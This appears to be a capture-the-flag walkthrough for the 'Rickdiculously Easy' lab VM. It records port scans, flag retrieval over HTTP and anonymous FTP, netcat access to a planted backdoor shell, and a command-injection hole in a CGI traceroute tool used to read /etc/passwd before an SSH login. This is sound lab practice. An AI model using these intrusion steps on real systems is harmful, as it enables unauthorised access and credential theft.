# VulnLab

## Rickdiculously Easy

### Remote SSH Access

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.1.4 -oA test
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 09:56 EDT
Nmap scan report for 192.168.1.4
Host is up (0.000070s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
9090/tcp  open  zeus-admin
13337/tcp open  unknown
22222/tcp open  easyengine
60000/tcp open  unknown
MAC Address: 08:00:27:BF:52:95 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
```

> [!NOTE] SSH Shell
> The SSH Shell is open on the port 22222

### Flags

- **Flag_Yeah d- just don't do it** :

  Steps:

  - dirb <http://192.168.1.4/>
  - Then curl <http://192.168.1.4/passwords/>
  - To finally know to curl <http://192.168.1.4/passwords/FLAG.txt>

  ```sh
  ┌──(kali㉿kali)-[~]
  └─$ curl 192.168.1.4/passwords/FLAG.txt
  FLAG{Yeah d- just don't do it.} - 10 Points
  ```

- **Flag_There is no Zeus, in your face!** :

  Steps:

  - Scan all ports with nmap
  - curl each http open ports, then, if answered, open it in a browser.
  - Open with a web browser: <http://192.168.1.4:9090>

  ![There is no Zeus, in your face!](src/img/labs/There%20is%20no%20Zeus,%20in%20your%20face!.png)

- **Flag_TheyFoundMyBackDoorMorty** :

  Steps:

  - Scan all ports with nmap
  - The result of the scan/scripts gives out the FLAG

  ```sh
  13337/tcp open  unknown
  | fingerprint-strings:
  |   NULL:
  |_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
  ```

- **FLAG_Whoa this is unexpected** :

  Steps:

  - Scan all ports with nmap
  - The result of the scan/scripts gives out the following:

    ```sh
    21/tcp    open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
    |_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
    ```

  - We establish an FTP shell as anonymous and get the file
  - We can open it and have the flag

  ```sh
  ┌──(kali㉿kali)-[~]
  └─$ cat FLAG.txt
  FLAG{Whoa this is unexpected} - 10 Points
  ```

- **FLAG_Flip the pickle Morty!** :

  Steps:

  - Scan all ports with Nmap
  - Find the `60000` ports open with the phrase `Welcome to Ricks half baked reverse shell...`
  - Netcat on it and do a quick ls
  - Find the FLAG and cat it

  ```sh
  ┌──(kali㉿kali)-[~]
  └─$ nc 192.168.1.4 60000
  Welcome to Ricks half baked reverse shell...
  # ls
  FLAG.txt
  # cat FLAG.txt
  FLAG{Flip the pickle Morty!} - 10 Points
  ```

- **FLAG_Get off the high road Summer!** :

  Steps:

  - Use a vulenaribilty in the tracertool (<http://192.168.1.4/cgi-bin/tracertool.cgi>) to send commands inside the target
  - Tail/Head the user file (`/etc/passwd`), which gives:

    ![alt text](image.png)

  ```sh
  ┌──(kali㉿kali)-[~]
  └─$ ssh Summer@192.168.1.4 -p 22222
  Summer@192.168.1.4's password:
  Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
  [Summer@localhost ~]$ ls
  FLAG.txt
  [Summer@localhost ~]$ tail FLAG.txt
  FLAG{Get off the high road Summer!} - 10 Points
  ```

- **FLAG_131333** :

  ```sh
  ┌──(kali㉿kali)-[~]
  └─$ strings Safe_Password.jpg
  JFIF
  Exif
  8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
  8BIM
  8BIM
  $3br
  %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
      #3R
  &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
  0D000D\DDDD\t\\\\\t
  ┌──(kali㉿kali)-[~]
  └─$ unzip journal.txt.zip
  Archive:  journal.txt.zip
  [journal.txt.zip] journal.txt password:
    inflating: journal.txt
  ┌──(kali㉿kali)-[~]
  └─$ cat journal.txt
  Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
  
  Anyway. Here it is:
  
  FLAG: {131333} - 20 Points
  ```

- **FLAG_And Awwwaaaaayyyy we Go!** :

  ```sh
  ┌──(kali㉿kali)-[~]
  └─$ ./safe
  Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
  ┌──(kali㉿kali)-[~]
  └─$ ./safe 131333
  decrypt: FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
  
  Ricks password hints:
   (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
  Follow these clues, in order
  
  
  1 uppercase character
  1 digit
  One of the words in my old bands name.
  ```
